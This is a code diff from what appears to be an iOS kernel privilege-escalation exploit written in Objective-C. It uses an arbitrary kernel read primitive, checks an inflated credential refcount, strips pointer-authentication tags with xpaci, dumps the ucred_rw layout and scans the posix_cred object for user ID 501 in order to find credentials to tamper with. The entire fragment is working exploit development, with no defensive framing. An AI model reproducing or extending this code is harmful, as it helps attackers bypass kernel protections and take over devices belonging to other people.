@@ -753,9 +753,17 @@
         [r appendFormat:@"  refcount after  = 0x%016llx  %s\n", refAfter,
             (refAfter == ref0 + 0x10000) ? "INFLATED OK" : "FAILED"];
 
-        // 5. Find uid cluster — rw10 is a POINTER to posix_cred, follow it
-        uint64_t rw10 = early_kread64(ucredRw + 0x10);
-        [r appendFormat:@"  rw10 (posix_cred ptr) = 0x%016llx\n", rw10];
+        // 5. Find uid cluster — rw10 is a PAC-tagged pointer, strip PAC
+        extern uint64_t xpaci(uint64_t ptr);
+        uint64_t rw10raw = early_kread64(ucredRw + 0x10);
+        uint64_t rw10 = xpaci(rw10raw);
+        [r appendFormat:@"  rw10 raw=0x%016llx → xpaci=0x%016llx\n", rw10raw, rw10];
+        // Dump ucred_rw to understand layout
+        [r appendString:@"  ucred_rw dump:\n"];
+        for (uint32_t o = 0; o < 0x80; o += 8) {
+            uint64_t q = early_kread64(ucredRw + o);
+            [r appendFormat:@"    +0x%02x: 0x%016llx\n", o, q];
+        }
         int found501 = 0;
         // Scan the posix_cred object at rw10 for 501
         if (rw10 > 0xfffffff000000000ULL) {
